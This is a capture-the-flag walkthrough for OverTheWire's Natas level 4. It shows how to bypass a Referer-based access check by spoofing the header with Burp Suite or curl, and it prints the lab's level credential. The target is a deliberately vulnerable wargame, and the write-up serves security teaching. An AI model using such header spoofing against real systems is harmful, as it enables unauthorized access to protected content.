# Natas — Level 4

**URL:** http://natas4.natas.labs.overthewire.org  
**Username:** `natas4`  
**Password:** `QryZXc2e0zahULdHrtHxzyYkj59kUxLQ`

---

## Goal
Find the password for the next level.

---

## Solution

Upon accessing the page, the following message is displayed:

> *"Access disallowed. You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/""*

After clicking **Refresh**, the message updates to:

> *"Access disallowed. You are visiting from "http://natas4.natas.labs.overthewire.org/" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/""*

The server is checking the **`Referer` header** to verify where the request is coming from. Since we are accessing the page directly, our `Referer` is either empty or points to `natas4` itself — not `natas5` as expected.

The fix is simple: **intercept the request and manually set the `Referer` header** to `http://natas5.natas.labs.overthewire.org/`.

### Using Burp Suite

1. Enable the Burp proxy and intercept the request to `natas4`
2. Find the `Referer` header in the request
3. Change its value to `http://natas5.natas.labs.overthewire.org/`
4. Forward the request — the server grants access and reveals the password

### Using cURL

The same can be done directly with cURL using the `-e` flag (or `-H`) to set the `Referer` header:

```bash
curl -u natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ \
  -e 'http://natas5.natas.labs.overthewire.org/' \
  http://natas4.natas.labs.overthewire.org/

# alternatively with -H
curl -u natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ \
  -H 'Referer: http://natas5.natas.labs.overthewire.org/' \
  http://natas4.natas.labs.overthewire.org/
```

---

## Concept
> The **`Referer` header** is a client-controlled value — it can be set to anything by the user. **Never use it as a security or access control mechanism.** Any attacker can spoof it trivially with a proxy like Burp Suite or with cURL.
